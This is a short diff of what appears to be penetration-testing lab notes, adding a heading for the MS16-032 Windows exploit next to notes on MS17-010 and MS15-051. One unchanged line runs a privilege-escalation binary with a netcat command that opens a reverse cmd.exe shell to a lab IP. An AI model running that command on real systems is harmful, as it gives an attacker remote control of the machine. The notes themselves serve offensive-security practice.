@@ -94,6 +94,9 @@ git clone https://github.com/worawit/MS17-010.git
   * ms15-051x64.exe "nc.exe 10.10.14.28 4444 -e cmd.exe"
 * Needs Listener
 
+### Windows
+#### MS16-032
+
 
 ## Privilege Escalation
 ### Windows
